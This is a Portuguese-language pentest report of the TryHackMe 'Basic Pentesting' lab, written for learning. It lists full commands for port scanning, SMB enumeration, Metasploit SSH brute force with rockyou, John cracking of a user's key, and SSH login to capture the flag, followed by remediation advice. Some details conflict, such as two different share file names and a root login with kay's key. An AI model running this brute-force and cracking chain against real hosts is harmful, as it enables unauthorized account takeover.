# Report — Máquina: `Basic Pentesting` — `10.201.40.106`

- **Fonte:** THM
    
- **Data:** `2025-11-05`
    
- **Autor:** Enrico Moreno
    
- **Nível:** easy
    
- **Tempo gasto:** 3h
    

---

## 1) Executive summary (1–3 linhas)

Nmap revelou portas SSH(22), HTTP(80) e SMB(445). A enumeração web revelou `/development` apontando para SMB; via SMB foi obtido `.txt` com os nomes `jan` e `kay`. Com brute-force SSH contra `jan` (rockyou) obteve-se acesso; dentro do sistema encontrou uma chave/hash de `kay`, que foi crackeada com John, permitindo SSH final como `kay` e obtenção da flag.

---

## 2) Escopo & Limitações

- **Alvo(s) testados:** `http://10.201.40.106/`, `ssh://10.201.40.106/`, SMB `10.201.40.106`.
    
- **Ferramentas autorizadas:** nmap, Metasploit (dir_scanner, ssh_login), enum4linux, smbclient, John the Ripper, rockyou.txt.
    
- **Limitações:** ambiente THM; sem ações persistentes nem pivot externo.
    

---

## 3) Metodologia aplicada

- Recon: `nmap` (detecção de portas/serviços).
    
- Enumeração web: `dir_scanner` (Metasploit) para descobrir `/development`.
    
- Enumeração SMB: `enum4linux`, `smbclient` para obter `users.txt`.
    
- Ataque de credenciais: `ssh_login` (Metasploit) com `rockyou.txt` sobre `jan`.
    
- Cracking: exportação de hash/chave → `john` para recuperar credencial de `kay`.
    
- Pós-exploração: acesso SSH, busca por diretórios ocultos e exfiltração da flag.
    
- Documentação: comandos, PoC e evidências salvas em `evidence/`.
    

---

## 4) Achado principal

**Vulnerabilidade:** Informação sensível exposta em share SMB + autenticação fraca (permitiu brute-force SSH e escalonamento por credenciais).  
**Local / Endpoint:** `GET /development` (HTTP) → referência a SMB; SMB share contendo `.txt` com `jan` e `kay`; SSH ativo em `10.201.40.106:22`.  
**Prova curta (PoC):** login SSH com `jan` obtido por brute-force; dentro do home de `jan` chave/hash de `kay` recuperada; `john` recuperou credencial; SSH como `kay` retornou flag final.  
**Flag / Artefato:** Flag final obtida por `kay` (arquivo final).

---

## 5) Evidências / PoC (resumo)

### Comandos principais

```
# Recon
nmap -sC -sV -oN nmap_initial.txt 10.201.40.106

# Dir scan (Metasploit)
# dentro do msfconsole:
use auxiliary/scanner/http/dir_scanner
set RHOSTS 10.201.40.106
run

# Enum SMB
enum4linux -a 10.201.40.106
smbclient //10.201.40.106/SHARE -N -c 'get users.txt'

# Bruteforce SSH (jan) - Metasploit
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.201.40.106
set USERNAME jan
set PASSWORD_FILE /usr/share/wordlists/rockyou.txt
run

# SSH com credenciais obtidas
ssh jan@10.201.40.106

# Salvar hash/chave encontrada e crack com John
# (exemplo: cp /path/to/found_hash /tmp/hash.txt)
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash.txt

# SSH final (ex.: usando chave)
ssh -i kay_key root@10.201.40.106
# ou (se foi senha)
ssh kay@10.201.40.106
cat /path/to/flag.txt
```

### Resultados-chave (resumo)

- `nmap`: 22/tcp open ssh; 80/tcp open http; 445/tcp open microsoft-ds.
    
- `dir_scanner`: encontrou `/development` com texto referenciando SMB.
    
- `enum4linux` / `smbclient`: `users.txt` contendo `jan` e `kay`.
    
- `ssh_login`: brute-force bem-sucedido contra `jan`.
    
- Dentro do home de `jan`: diretório oculto → hash/chave de `kay`.
    
- `john`: recuperou credencial de `kay`; login SSH como `kay` retornou a flag final.
    

### Arquivos / screenshots sugeridos (colocar em evidence/)

- `evidence/nmap_initial.txt`
    
- `evidence/development_page.txt`
    
- `evidence/users.txt`
    
- `evidence/ssh-jan-login.png`
    
- `evidence/hash-kay.txt`
    
- `evidence/john-kay-cracked.txt`
    
- `evidence/kay-flag.png`
    

---

## 6) Impacto & Severidade

**Severidade:** Alta.  
**Justificativa:** combinação de compartilhamento exposto e senhas fracas permitiu compromisso de contas locais e acesso final com privilégio, possibilitando controle/exfiltração da máquina.

---

## 7) Reproduzir (passo-a-passo reprodutível)

1. `nmap -sC -sV -oN nmap_initial.txt 10.201.40.106`
    
2. Usar `dir_scanner` (Metasploit) para descobrir `/development`.
    
3. `enum4linux -a 10.201.40.106` e `smbclient //10.201.40.106/SHARE -N -c 'get dev.txt'`.
    
4. Bruteforce SSH para `jan`: `ssh_login` com `/usr/share/wordlists/rockyou.txt`.
    
5. Login SSH em `jan`; procurar arquivos ocultos (`ls -la` em `/home/kay`).
    
6. Extrair hash/chave; `john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/id_rsa.txt`.
    
7. Acesso final via SSH (chave ou senha) como `kay`; coletar flag (`cat /flag.txt`).
    

---

## 8) Recomendações (rápidas para gestor)

- Remover exposição pública de dados sensíveis em shares SMB; desabilitar acesso anônimo/guest.
    
- Implementar políticas de senha fortes e detecção de brute-force (rate limiting, bloqueio por IP).
    
- Migrar contas privilegiadas para autenticação por chave e desabilitar autenticação por senha no SSH.
    

---

## 9) Recomendações técnicas (detalhadas)

- **SMB**
    
    - Desabilitar `guest`/anonymous access.
        
    - Aplicar ACLs para limitar acesso por usuário/grupo/host.
        
    - Habilitar logging e retenção de logs de acesso ao share.
        
- **SSH**
    
    - No `/etc/ssh/sshd_config`: `PasswordAuthentication no`, `PermitRootLogin no`, habilitar `PubkeyAuthentication yes`.
        
    - Implantar `fail2ban` ou equivalente para bloquear IPs com tentativas repetidas.
        
    - Auditoria e rotação forçada de credenciais fracas.
        
- **Detecção**
    
    - IDS/IPS para tentativas de brute-force e transferências SMB suspeitas.
        
    - Verificações regulares de conteúdo público em shares.
        

---

## 10) Apêndice técnico (comandos & outputs)

- Nmap: `nmap -sC -sV -p- 10.201.40.106`.
    
- Dir scanner (msf): use auxiliary/scanner/http/dir_scanner → encontrou `/development`.
    
- Enum4linux: `enum4linux -a 10.201.40.106` → (salvar saída).
    
- smbclient: `smbclient //10.201.40.106/SHARE -N -c 'get dev.txt'` → `users.txt` com `jan` e `kay`.
    
- ssh_login (msf): brute-force com `/usr/share/wordlists/rockyou.txt` → credenciais `jan` obtidas.
    
- John: `john --wordlist=/usr/share/wordlists/rockyou.txt /id_rsa.txt` → senha/chave de `kay`.
    
- SSH final: `ssh -i kay_key root@10.201.40.106` ou `ssh kay@10.201.40.106` → `cat /path/to/flag.txt`.

## Saídas 
![](SSHBPTHM.png)
![](SSHBRUTETHM.png)
![](FIM.png)

---
## 11) Lições aprendidas / follow-up

- Priorizar revisão de shares SMB na rede; procurar outras máquinas com exposição similar.
    
- Forçar rotação de credenciais e aplicar autenticação por chave.
    
- Retest após correções (sugestão: 7–14 dias).